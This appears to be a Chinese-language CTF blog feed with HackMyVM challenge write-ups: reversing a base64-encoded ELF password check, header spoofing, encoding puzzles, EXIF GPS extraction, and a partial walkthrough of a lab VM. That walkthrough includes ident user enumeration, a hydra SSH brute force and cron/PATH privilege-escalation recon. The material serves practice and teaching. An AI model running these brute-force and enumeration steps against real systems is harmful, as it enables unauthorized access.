AGZyYW1lX2R1bW15AF9fZnJhbWVfZHVtbXlfaW5pdF9hcnJheV9lbnRyeQBmaWxlLmMAX19GUkFN
RV9FTkRfXwBfRFlOQU1JQwBfX0dOVV9FSF9GUkFNRV9IRFIAX0dMT0JBTF9PRkZTRVRfVEFCTEVf
AF9fbGliY19zdGFydF9tYWluQEdMSUJDXzIuMzQAX0lUTV9kZXJlZ2lzdGVyVE1DbG9uZVRhYmxl
AF9lZGF0YQBfZmluaQBzdHJsZW5AR0xJQkNfMi4yLjUAcHJpbnRmQEdMSUJDXzIuMi41AF9fZGF0
YV9zdGFydABfX2dtb25fc3RhcnRfXwBfX2Rzb19oYW5kbGUAX0lPX3N0ZGluX3VzZWQAX2VuZABf
X2Jzc19zdGFydABtYWluAF9faXNvYzk5X3NjYW5mQEdMSUJDXzIuNwBfX1RNQ19FTkRfXwBfSVRN
X3JlZ2lzdGVyVE1DbG9uZVRhYmxlAF9fY3hhX2ZpbmFsaXplQEdMSUJDXzIuMi41AF9pbml0AAAu
c3ltdGFiAC5zdHJ0YWIALnNoc3RydGFiAC5pbnRlcnAALm5vdGUuZ251LnByb3BlcnR5AC5ub3Rl
LmdudS5idWlsZC1pZAAubm90ZS5BQkktdGFnAC5nbnUuaGFzaAAuZHluc3ltAC5keW5zdHIALmdu
dS52ZXJzaW9uAC5nbnUudmVyc2lvbl9yAC5yZWxhLmR5bgAucmVsYS5wbHQALmluaXQALnBsdC5n
b3QALnRleHQALmZpbmkALnJvZGF0YQAuZWhfZnJhbWVfaGRyAC5laF9mcmFtZQAuaW5pdF9hcnJh
eQAuZmluaV9hcnJheQAuZHluYW1pYwAuZ290LnBsdAAuZGF0YQAuYnNzAC5jb21tZW50AAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAbAAAAAQAAAAIAAAAAAAAAGAMAAAAAAAAYAwAAAAAAABwAAAAAAAAAAAAAAAAAAAAB
AAAAAAAAAAAAAAAAAAAAIwAAAAcAAAACAAAAAAAAADgDAAAAAAAAOAMAAAAAAAAgAAAAAAAAAAAA
AAAAAAAACAAAAAAAAAAAAAAAAAAAADYAAAAHAAAAAgAAAAAAAABYAwAAAAAAAFgDAAAAAAAAJAAA
AAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAABJAAAABwAAAAIAAAAAAAAAfAMAAAAAAAB8AwAA
AAAAACAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAVwAAAPb//28CAAAAAAAAAKADAAAA
AAAAoAMAAAAAAAAkAAAAAAAAAAYAAAAAAAAACAAAAAAAAAAAAAAAAAAAAGEAAAALAAAAAgAAAAAA
AADIAwAAAAAAAMgDAAAAAAAA2AAAAAAAAAAHAAAAAQAAAAgAAAAAAAAAGAAAAAAAAABpAAAAAwAA
AAIAAAAAAAAAoAQAAAAAAACgBAAAAAAAAK8AAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA
cQAAAP///28CAAAAAAAAAFAFAAAAAAAAUAUAAAAAAAASAAAAAAAAAAYAAAAAAAAAAgAAAAAAAAAC
AAAAAAAAAH4AAAD+//9vAgAAAAAAAABoBQAAAAAAAGgFAAAAAAAAQAAAAAAAAAAHAAAAAQAAAAgA
AAAAAAAAAAAAAAAAAACNAAAABAAAAAIAAAAAAAAAqAUAAAAAAACoBQAAAAAAAMAAAAAAAAAABgAA
AAAAAAAIAAAAAAAAABgAAAAAAAAAlwAAAAQAAABCAAAAAAAAAGgGAAAAAAAAaAYAAAAAAABIAAAA
AAAAAAYAAAAYAAAACAAAAAAAAAAYAAAAAAAAAKEAAAABAAAABgAAAAAAAAAAEAAAAAAAAAAQAAAA
AAAAFwAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAACcAAAAAQAAAAYAAAAAAAAAIBAAAAAA
AAAgEAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAApwAAAAEAAAAGAAAAAAAA
AGAQAAAAAAAAYBAAAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAALAAAAABAAAA
BgAAAAAAAABwEAAAAAAAAHAQAAAAAAAAOAIAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAC2
AAAAAQAAAAYAAAAAAAAAqBIAAAAAAACoEgAAAAAAAAkAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAA
AAAAAAAAvAAAAAEAAAACAAAAAAAAAAAgAAAAAAAAACAAAAAAAABSAAAAAAAAAAAAAAAAAAAABAAA
AAAAAAAAAAAAAAAAAMQAAAABAAAAAgAAAAAAAABUIAAAAAAAAFQgAAAAAAAALAAAAAAAAAAAAAAA
AAAAAAQAAAAAAAAAAAAAAAAAAADSAAAAAQAAAAIAAAAAAAAAgCAAAAAAAACAIAAAAAAAAKwAAAAA
AAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAA3AAAAA4AAAADAAAAAAAAANA9AAAAAAAA0C0AAAAA
AAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAOgAAAAPAAAAAwAAAAAAAADYPQAAAAAA
ANgtAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAAD0AAAABgAAAAMAAAAAAAAA
4D0AAAAAAADgLQAAAAAAAOABAAAAAAAABwAAAAAAAAAIAAAAAAAAABAAAAAAAAAAqwAAAAEAAAAD
AAAAAAAAAMA/AAAAAAAAwC8AAAAAAAAoAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAP0A
AAABAAAAAwAAAAAAAADoPwAAAAAAAOgvAAAAAAAAMAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAA
AAAAAAAGAQAAAQAAAAMAAAAAAAAAGEAAAAAAAAAYMAAAAAAAABAAAAAAAAAAAAAAAAAAAAAIAAAA
AAAAAAAAAAAAAAAADAEAAAgAAAADAAAAAAAAAChAAAAAAAAAKDAAAAAAAAAIAAAAAAAAAAAAAAAA
AAAAAQAAAAAAAAAAAAAAAAAAABEBAAABAAAAMAAAAAAAAAAAAAAAAAAAACgwAAAAAAAAHgAAAAAA
AAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAABAAAAAgAAAAAAAAAAAAAAAAAAAAAAAABIMAAAAAAA
AJADAAAAAAAAHQAAABIAAAAIAAAAAAAAABgAAAAAAAAACQAAAAMAAAAAAAAAAAAAAAAAAAAAAAAA
2DMAAAAAAAAIAgAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAABEAAAADAAAAAAAAAAAAAAAA
AAAAAAAAAOA1AAAAAAAAGgEAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAA=                                                                                                                                                                                   
```

![image-20250612184500514](https://7r1umphk.github.io/image/202506121845914.webp)

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ base64 -d 21.txt &gt; 21
base64: invalid input
                         
```

忽略非法字符

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ base64 -d -i 21.txt &gt; 21
        
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ file 21            
21: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=8d11d870b5649e8ca1a0b6777160c1fc53f1f051, for GNU/Linux 3.2.0, not stripped
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ ./21       
Enter passwd: 123456
Almost                                                                                                                                                                       
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ strings 21                 
/lib64/ld-linux-x86-64.so.2
__cxa_finalize
__libc_start_main
strlen
__isoc99_scanf
printf
libc.so.6
GLIBC_2.7
GLIBC_2.2.5
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
$uperZecretP4zz
Enter passwd: 
Almost
Correct
really close
Close
Incorrect
;*3$'
GCC: (Debian 12.2.0-1) 12.2.0
Scrt1.o
__abi_tag
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
file.c
__FRAME_END__
_DYNAMIC
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_start_main@GLIBC_2.34
_ITM_deregisterTMCloneTable
_edata
_fini
strlen@GLIBC_2.2.5
printf@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
_end
__bss_start
main
__isoc99_scanf@GLIBC_2.7
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@GLIBC_2.2.5
_init
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment
       
```

ida

```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s[264]; // [rsp+0h] [rbp-120h] BYREF
  const char *v5; // [rsp+108h] [rbp-18h]
  int i; // [rsp+114h] [rbp-Ch]
  int v7; // [rsp+118h] [rbp-8h]
  int v8; // [rsp+11Ch] [rbp-4h]

  v5 = '$uperZecretP4zz';
  v8 = 0;
  v7 = 1;
  printf('Enter passwd: ');
  __isoc99_scanf('%s', s);
  if ( strlen(s) == 6 )
  {
    if ( s[0] == 80 )
    {
      for ( i = 1; i &lt;= 5; ++i )
      {
        v8 += s[i] - 48;
        v7 *= s[i] - 48;
      }
      if ( v8 == 24 &amp;&amp; v7 == 2048 )
      {
        if ( s[1] == 56 )
          printf('Correct');
        else
          printf('really close');
      }
      else
      {
        printf('Close');
      }
    }
    else
    {
      printf('Almost');
    }
  }
  else
  {
    printf('Incorrect');
  }
  return 0;
}
```

分析

```
scanf('%s', s); // 用户输入密码，最多 263 字节，存在 s 数组中
if (strlen(s) == 6) // 密码长度必须是 6
{
    if (s[0] == 80) // 第一个字符必须是 ASCII 值 80 -&gt; 'P'
    {
        // 对后5位字符 (s[1] 到 s[5])，做以下处理：
        // 它们必须是数字字符（因为减去 '0'(48)），否则求和乘积会错误
        for (i = 1; i &lt;= 5; ++i)
        {
            v8 += s[i] - 48; // 加总
            v7 *= s[i] - 48; // 乘积
        }

        if (v8 == 24 &amp;&amp; v7 == 2048) // 满足加和与乘积条件
        {
            if (s[1] == 56) // 第二个字符必须是 '8'
                printf('Correct');
            else
                printf('really close');
        }
        else
        {
            printf('Close');
        }
    }
    else
    {
        printf('Almost');
    }
}
else
{
    printf('Incorrect');
}

```

**寻找一个以 'P8' 开头的6位密码，其后4位数字与数字8相加总和为24，相乘总积为2048。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20021.html</guid><pubDate>Fri, 27 Jun 2025 09:32:02 +0000</pubDate></item><item><title>Challenge 020</title><link>https://7r1UMPHK.github.io/post/Challenge%20020.html</link><description>![image-20250612183946052](https://7r1umphk.github.io/image/202506121839359.webp)

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ curl http://momo.hackmyvm.eu/li0nsg3l9vhhe/                        
You are not coming from https://nepcodex.com/                                         
```

伪造`Referer` 请求头

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ curl -e https://nepcodex.com/ http://momo.hackmyvm.eu/li0nsg3l9vhhe/
HMV{youareawelcome}                                                                  
```

。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20020.html</guid><pubDate>Fri, 27 Jun 2025 09:31:58 +0000</pubDate></item><item><title>Challenge 019</title><link>https://7r1UMPHK.github.io/post/Challenge%20019.html</link><description>![image-20250612183423004](https://7r1umphk.github.io/image/202506121834338.webp)

下载

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ ll 019.zip        
-rwxr-xr-x 1 kali kali 276 Jun 12 06:34 019.zip
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ 7z x 019.zip                 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 276 bytes (1 KiB)

Extracting archive: 019.zip
--
Path = 019.zip
Type = zip
Physical Size = 276

Everything is Ok

Size:       588
Compressed: 276
          
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ cat 019.txt   
▄▄▄▄▄▄▄ ▄▄  ▄ ▄▄▄▄▄▄▄.█ ▄▄▄ █ ▄▀▄ █ █ ▄▄▄ █.█ ███ █ █▄▄█  █ ███ █.█▄▄▄▄▄█ ▄ ▄ ▄ █▄▄▄▄▄█.▄▄▄▄  ▄ ▄▀█▄▄▄  ▄▄▄ ▄.▀▄▀ ▄ ▄ ▄█▄▀ ▄██▀▀ ▄▄. █▄██▄▄███▀▄▄ ▄█ █▄▀▄.▄▄▄▄▄▄▄ ▀▄█▄▀  ▄█ ▄ ▀.█ ▄▄▄ █  ▄▄ ▀▀  ▀▀█▄▀.█ ███ █ █▀▄███ ▀ ▄▀▀ .█▄▄▄▄▄█ █▀ ▀▀▀█▀▄ ▄ ▀                                                                                                                                                          
```

看着像qr码

找规律，最后都有点，过滤一下

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ cat 019.txt | tr '.' '\n' 
▄▄▄▄▄▄▄ ▄▄  ▄ ▄▄▄▄▄▄▄
█ ▄▄▄ █ ▄▀▄ █ █ ▄▄▄ █
█ ███ █ █▄▄█  █ ███ █
█▄▄▄▄▄█ ▄ ▄ ▄ █▄▄▄▄▄█
▄▄▄▄  ▄ ▄▀█▄▄▄  ▄▄▄ ▄
▀▄▀ ▄ ▄ ▄█▄▀ ▄██▀▀ ▄▄
 █▄██▄▄███▀▄▄ ▄█ █▄▀▄
▄▄▄▄▄▄▄ ▀▄█▄▀  ▄█ ▄ ▀
█ ▄▄▄ █  ▄▄ ▀▀  ▀▀█▄▀
█ ███ █ █▀▄███ ▀ ▄▀▀ 
█▄▄▄▄▄█ █▀ ▀▀▀█▀▄ ▄ ▀                                                                                                                                                                                    
```

草料解一下https://cli.im/deqr/other

![image-20250612183849873](https://7r1umphk.github.io/image/202506121838056.webp)

```
HMV{asciiartt}
```

。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20019.html</guid><pubDate>Fri, 27 Jun 2025 09:31:56 +0000</pubDate></item><item><title>Challenge 018</title><link>https://7r1UMPHK.github.io/post/Challenge%20018.html</link><description>![image-20250612182911676](https://7r1umphk.github.io/image/202506121829958.webp)

```
http://momo.hackmyvm.eu/ZiP004JfyGh/
```

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ curl http://momo.hackmyvm.eu/ZiP004JfyGh/
&lt;!doctype html&gt;
&lt;html lang='en'&gt;
&lt;title&gt;018&lt;/title&gt;
Maybe the flag is in aaAxghuyrtlksd.php
&lt;/html&gt;
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ curl http://momo.hackmyvm.eu/ZiP004JfyGh/aaAxghuyrtlksd.php
Yes, I have the flag! :)      

┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ curl -i http://momo.hackmyvm.eu/ZiP004JfyGh/aaAxghuyrtlksd.php
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Thu, 12 Jun 2025 10:30:38 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive

Yes, I have the flag! :)                                                                
```

POST请求

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ curl -X POST http://momo.hackmyvm.eu/ZiP004JfyGh/aaAxghuyrtlksd.php   
HMV{postpostpost}                                                                     
```

。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20018.html</guid><pubDate>Fri, 27 Jun 2025 09:31:53 +0000</pubDate></item><item><title>Challenge 017</title><link>https://7r1UMPHK.github.io/post/Challenge%20017.html</link><description>![image-20250612182714769](https://7r1umphk.github.io/image/202506121827070.webp)

```
⠓⠍⠧{⠊⠙⠕⠝⠞⠅⠝⠕⠺⠃⠗⠁⠊⠇⠇⠑}
```

盲文

https://zh.wikipedia.org/wiki/%E7%9B%B2%E6%96%87

自己对着转

```
HMV{idontknowbraille}
```

。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20017.html</guid><pubDate>Fri, 27 Jun 2025 09:31:47 +0000</pubDate></item><item><title>Challenge 015</title><link>https://7r1UMPHK.github.io/post/Challenge%20015.html</link><description>**挑战链接:** https://hackmyvm.eu/challenges/challenge.php?c=015

![挑战图片](https://7r1umphk.github.io//image/20250518141943225.webp)

## 1. 初步分析

挑战页面显示了一段被 `&lt;pre&gt;` 标签包裹的文本：

```html
&lt;pre&gt; push 7d616579 push 74696874 push 726f7773 push 696d7361 push 7b766d68 &lt;/pre&gt;
```

该文本包含一系列 `push` 指令，后跟十六进制数值。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20015.html</guid><pubDate>Fri, 27 Jun 2025 09:31:26 +0000</pubDate></item><item><title>Challenge 037</title><link>https://7r1UMPHK.github.io/post/Challenge%20037.html</link><description>![image-20250614105743955](https://7r1umphk.github.io/image/20250614105744262.webp)

还是扫街

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ ll 037.zip 
-rwxr-xr-x 1 kali kali 6256698 Jun 13 22:57 037.zip
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ unzip 037.zip 
Archive:  037.zip
  inflating: osint.jpg               
             
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ exiftool osint.jpg 
ExifTool Version Number         : 13.25
File Name                       : osint.jpg
Directory                       : .
File Size                       : 6.3 MB
File Modification Date/Time     : 2023:07:17 21:14:46-04:00
File Access Date/Time           : 2025:06:13 22:58:07-04:00
File Inode Change Date/Time     : 2023:07:17 21:14:46-04:00
File Permissions                : -rwxr-xr-x
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Little-endian (Intel, II)
Make                            : Sony
Camera Model Name               : E5823
Orientation                     : Horizontal (normal)
X Resolution                    : 72
Y Resolution                    : 72
Resolution Unit                 : inches
Software                        : 32.2.A.0.253_0_f500
Modify Date                     : 2016:07:25 20:44:46
Y Cb Cr Positioning             : Centered
Exposure Time                   : 1/2000
F Number                        : 2.0
ISO                             : 40
Exif Version                    : 0220
Date/Time Original              : 2016:07:25 20:44:46
Create Date                     : 2016:07:25 20:44:46
Components Configuration        : Y, Cb, Cr, -
Shutter Speed Value             : 1/1992
Exposure Compensation           : 0
Metering Mode                   : Multi-segment
Light Source                    : Unknown
Flash                           : Off, Did not fire
Focal Length                    : 4.2 mm
Soft Skin Effect                : Off
Face Info Offset                : 94
Sony Date Time                  : 2016:07:25 20:44:46
Sony Image Height               : 4160
Sony Image Width                : 5520
Faces Detected                  : 0
Face Info Length                : 26
Meta Version                    : 
Sub Sec Time                    : 461942
Sub Sec Time Original           : 461942
Sub Sec Time Digitized          : 461942
Flashpix Version                : 0100
Color Space                     : sRGB
Exif Image Width                : 5520
Exif Image Height               : 4140
Interoperability Index          : R98 - DCF basic file (sRGB)
Interoperability Version        : 0100
Custom Rendered                 : Normal
Exposure Mode                   : Auto
White Balance                   : Auto
Digital Zoom Ratio              : 1
Scene Capture Type              : Landscape
Subject Distance Range          : Unknown
GPS Version ID                  : 2.2.0.0
GPS Latitude Ref                : North
GPS Longitude Ref               : East
GPS Altitude Ref                : Above Sea Level
GPS Time Stamp                  : 18:44:29
GPS Status                      : Measurement Active
GPS Map Datum                   : WGS-84
GPS Date Stamp                  : 2016:07:25
Compression                     : JPEG (old-style)
Thumbnail Offset                : 21346
Thumbnail Length                : 3982
Image Width                     : 5520
Image Height                    : 4140
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Aperture                        : 2.0
Image Size                      : 5520x4140
Megapixels                      : 22.9
Shutter Speed                   : 1/2000
Create Date                     : 2016:07:25 20:44:46.461942
Date/Time Original              : 2016:07:25 20:44:46.461942
Modify Date                     : 2016:07:25 20:44:46.461942
Thumbnail Image                 : (Binary data 3982 bytes, use -b option to extract)
GPS Altitude                    : 25 m Above Sea Level
GPS Date/Time                   : 2016:07:25 18:44:29Z
GPS Latitude                    : 58 deg 58' 2.87' N
GPS Longitude                   : 18 deg 18' 59.03' E
Focal Length                    : 4.2 mm
GPS Position                    : 58 deg 58' 2.87' N, 18 deg 18' 59.03' E
Light Value                     : 14.3
                      
```

![osint](https://7r1umphk.github.io/image/20250614110003767.webp)

有GPS信息！

将经纬度转换成十进制

https://www.sunearthtools.com/dp/tools/conversion.php?lang=cn

![image-20250614111103736](https://7r1umphk.github.io/image/20250614111103977.webp)

然后我去试不行

后面我尝试添加一点减少一点才成功

正确的是

```
HMV{58.967463,18.316396}
```

。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20037.html</guid><pubDate>Fri, 27 Jun 2025 09:31:23 +0000</pubDate></item><item><title>hmv_hannah</title><link>https://7r1UMPHK.github.io/post/hmv_hannah.html</link><description># hmv_hannah

# 0.简介

**靶机**：https://hackmyvm.eu/machines/machine.php?vm=Hannah  
**难度**：绿色  
**目标 IP**：192.168.205.150  
**本机 IP**：192.168.205.128

# 1.扫描

​`nmap`​起手

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -A -Pn -n --min-rate 10000 192.168.205.150
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-08 16:07 CST
Nmap scan report for 192.168.205.150
Host is up (0.00031s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 5f:1c:78:36:99:05:32:09:82:d3:d5:05:4c:14:75:d1 (RSA)
|   256 06:69:ef:97:9b:34:d7:f3:c7:96:60:d1:a1:ff:d8:2c (ECDSA)
|_  256 85:3d:da:74:b2:68:4e:a6:f7:e5:f5:85:40:90:2e:9a (ED25519)
|_auth-owners: root
80/tcp  open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
| http-robots.txt: 1 disallowed entry 
|_/enlightenment
|_http-title: Site doesn't have a title (text/html).
|_auth-owners: moksha
113/tcp open  ident?
|_auth-owners: root
MAC Address: 08:00:27:7C:E4:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.31 ms 192.168.205.150

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.58 seconds
                                                   
```

113未知端口，优先查看

# 2.踩点

https://book.hacktricks.wiki/zh/network-services-pentesting/113-pentesting-ident.html#basic-information

```
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.150:113                                                                       
curl: (56) Recv failure: 连接被对方重置
                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ nc 192.168.205.150 113 
hello 
                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ nc -vn 192.168.205.150 113
(UNKNOWN) [192.168.205.150] 113 (auth) open
hello
                            

┌──(kali㉿kali)-[~/test]
└─$ ident-user-enum 192.168.205.150 80 22 113
ident-user-enum v1.0 ( http://pentestmonkey.net/tools/ident-user-enum )

192.168.205.150:80      moksha
192.168.205.150:22      root
192.168.205.150:113     root
                               
```

有一个moksha用户，我们尝试爆破ssh

```
┌──(kali㉿kali)-[~/test]
└─$ hydra -l moksha -P /usr/share/wordlists/q5000.txt ssh://192.168.205.150 -V -I -u -f -e nsr -t 64

Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-08 16:23:42
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 5003 login tries (l:1/p:5003), ~79 tries per task
[DATA] attacking ssh://192.168.205.150:22/
[22][ssh] host: 192.168.205.150   login: moksha   password: hannah
[STATUS] attack finished for 192.168.205.150 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-08 16:23:44

```

我第一次爆破的时候没出来，真的有点无语

```
┌──(kali㉿kali)-[~/test]
└─$ ssh moksha@192.168.205.150    
moksha@192.168.205.150's password: 
Linux hannah 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jan  4 10:45:54 2023 from 192.168.1.51
moksha@hannah:~$ id
uid=1000(moksha) gid=1000(moksha) grupos=1000(moksha),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)

```

# 3.提权

```
moksha@hannah:~$ sudo -l
-bash: sudo: orden no encontrada
moksha@hannah:~$ which sudo
moksha@hannah:~$ find / -name sudo 2&gt;/dev/null
/usr/share/bash-completion/completions/sudo
moksha@hannah:~$ /usr/share/bash-completion/completions/sudo -l
-bash: /usr/share/bash-completion/completions/sudo: Permiso denegado
moksha@hannah:~$ ls -la /usr/share/bash-completion/completions/sudo
-rw-r--r-- 1 root root 1504 ago 12  2020 /usr/share/bash-completion/completions/sudo

```

我还以为又藏sudo呢

```
moksha@hannah:~$ ls -la
total 32
drwxr-xr-x 3 moksha moksha 4096 ene  4  2023 .
drwxr-xr-x 3 root   root   4096 ene  4  2023 ..
lrwxrwxrwx 1 moksha moksha    9 ene  4  2023 .bash_history -&gt; /dev/null
-rw-r--r-- 1 moksha moksha  220 ene  4  2023 .bash_logout
-rw-r--r-- 1 moksha moksha 3526 ene  4  2023 .bashrc
drwxr-xr-x 3 moksha moksha 4096 ene  4  2023 .local
-rw-r--r-- 1 moksha moksha  807 ene  4  2023 .profile
-rw------- 1 moksha moksha   14 ene  4  2023 user.txt
-rw------- 1 moksha moksha   52 ene  4  2023 .Xauthority
moksha@hannah:~$ cd ..
moksha@hannah:/home$ ls -al
total 12
drwxr-xr-x  3 root   root   4096 ene  4  2023 .
drwxr-xr-x 18 root   root   4096 ene  4  2023 ..
drwxr-xr-x  3 moksha moksha 4096 ene  4  2023 moksha
moksha@hannah:/home$ find / -perm -4000 -type f 2&gt;/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/su
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/mount
moksha@hannah:/home$ /sbin/getcap -r / 2&gt;/dev/null
/usr/bin/ping cap_net_raw=ep
moksha@hannah:/home$ cat /etc/cron*
cat: /etc/cron.d: Es un directorio
cat: /etc/cron.daily: Es un directorio
cat: /etc/cron.hourly: Es un directorio
cat: /etc/cron.monthly: Es un directorio
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/media:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
* * * * * root touch /tmp/enlIghtenment
17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
#
cat: /etc/cron.weekly: Es un directorio

moksha@hannah:/tmp$ which touch
/usr/bin/touch

moksha@hannah:/tmp$ ls -la /media
total 12
drwxrwxrwx  3 root root 4096 ene  4  2023 .
drwxr-xr-x 18 root root 4096 ene  4  2023 ..
lrwxrwxrwx  1 root root    6 ene  4  2023 cdrom -&gt; cdrom0
drwxr-xr-x  2 root root 4096 ene  4  2023 cdrom0

```

